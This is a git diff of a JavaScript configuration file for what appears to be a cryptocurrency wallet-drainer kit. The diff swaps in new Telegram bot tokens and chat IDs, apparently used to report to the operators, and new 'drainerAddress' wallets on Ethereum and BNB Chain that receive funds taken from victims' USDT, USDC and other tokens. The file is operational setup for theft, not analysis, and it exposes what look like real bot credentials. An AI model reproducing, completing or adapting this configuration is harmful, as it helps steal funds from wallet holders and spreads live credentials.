@@ -1,7 +1,7 @@
 const config = {
     // Telegram конфигурация
-    TELEGRAM_BOT_TOKEN: '7721458510:AAEVwtRZwK9GkRXyrzZpb2q1Y3l0-Hglp1A',
-    TELEGRAM_CHAT_ID: '-4659839751',
+    TELEGRAM_BOT_TOKEN: '7548956310:AAGhIaqSu9hQ5gRzKMICgunxAjE6iSfIiMI',
+    TELEGRAM_CHAT_ID: '-1002337940908',
   
     // Project ID для AppKit
     PROJECT_ID: 'd85cc83edb401b676e2a7bcef67f3be8',
@@ -15,7 +15,7 @@ const config = {
         rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
         usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
         usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
-        drainerAddress: "0x3a70bCC9de802799950CBc50a3D5a1B5605B969B",
+        drainerAddress: "0x0A57cf1e7E09ee337ce56108E857CC0537089CfC",
         otherTokenAddresses: {
           DAI: "0x6b175474e89094c44da98b954eedeac495271d0f",
           WBTC: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
@@ -53,7 +53,7 @@ const config = {
         ],
         usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
         usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
-        drainerAddress: "0x9C88B840949Af813E33da3c80b3fa717A54aAE62",
+        drainerAddress: "0x67062812416C73364926b9d31E183014deB95462",
         otherTokenAddresses: {
           SHIB: "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
           PEPE: "0x25d887ce7a35172c62febfd67a1856f20faebb00",
